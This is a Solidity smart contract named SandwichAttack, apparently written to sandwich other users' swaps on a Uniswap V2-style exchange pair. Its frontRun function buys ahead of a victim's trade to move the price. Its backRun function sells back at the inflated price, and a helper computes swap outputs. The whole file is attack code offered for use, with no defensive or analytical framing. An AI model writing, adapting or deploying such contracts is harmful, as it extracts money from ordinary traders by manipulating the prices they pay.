
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPair {
    function getReserves() external view returns (uint256, uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @notice Sandwich a victim swap: front-run to move the price, let the
///         victim fill at the worse price, then back-run for the profit.
contract SandwichAttack {
    IPair public pair;
    IWETH public weth;
    IERC20 public token;

    constructor(address _pair, address _weth, address _token) {
        pair = IPair(_pair);
        weth = IWETH(_weth);
        token = IERC20(_token);
    }

    /// Front-run: buy `amountIn` WETH of token at the fair price.
    function frontRun(uint256 amountIn) external returns (uint256 tknOut) {
        weth.deposit{value: amountIn}();
        weth.transfer(address(pair), amountIn);
        (uint256 r0, uint256 r1) = pair.getReserves();
        tknOut = getAmountOut(amountIn, r0, r1);
        pair.swap(0, tknOut, address(this));
    }

    /// Back-run: sell `tknIn` token back for WETH at the inflated price.
    function backRun(uint256 tknIn) external returns (uint256 wethOut) {
        (uint256 r0, uint256 r1) = pair.getReserves();
        wethOut = getAmountOut(tknIn, r1, r0);
        token.approve(address(pair), tknIn);
        token.transfer(address(pair), tknIn);
        pair.swap(wethOut * 95 / 100, 0, address(this));
        return weth.balanceOf(address(this));
    }

    // UniswapV2 getAmountOut (0.3% fee)
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}
